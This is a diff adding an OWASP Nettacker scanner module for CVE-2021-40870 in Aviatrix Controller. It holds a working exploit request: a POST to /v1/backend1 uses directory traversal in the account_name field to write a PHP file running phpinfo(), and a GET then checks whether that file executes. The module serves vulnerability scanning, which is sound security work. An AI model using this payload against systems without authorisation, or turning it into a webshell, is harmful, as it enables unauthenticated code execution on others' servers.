@@ -1,0 +1,83 @@
+info:
+  name: aviatrix_cve_2021_40870_vuln
+  author: OWASP Nettacker Team
+  severity: 9
+  description: Aviatrix Controller 6.x before 6.5-1804.1922. Unrestricted upload of a file with a dangerous type is possible, which allows an unauthenticated user to execute arbitrary code via directory traversal.
+  reference: 
+    - https://wearetradecraft.com/advisories/tc-2021-0002/
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-40870
+  profiles:
+    - vuln
+    - vulnerability
+    - http
+    - critical_severity
+    - cve2021
+    - cve
+    - aviatrix
+    - rce
+
+payloads:
+  - library: http
+    verify: false
+    timeout: 3
+    cert: ""
+    stream: false
+    proxies: ""
+    steps:
+      - method: post
+        headers:
+          User-Agent: "{user_agent}"
+          Host: "{target}"
+          Content-Type: application/x-www-form-urlencoded
+        allow_redirects: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/v1/backend1"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        data: CID=x&action=set_metric_gw_selections&account_name=/../../../var/www/php/random_string1.php&data=NETTACKER<?php phpinfo()?>
+        
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: '200'
+              reverse: false
+        
+      - method: get
+        headers:
+          User-Agent: "{user_agent}"
+          Host: "{target}"
+          Content-Type: application/x-www-form-urlencoded
+        allow_redirects: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/v1/random_string1.php"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: '200'
+              reverse: false
+            content:
+              regex: NETTACKER&PHP Version
+              reverse: false
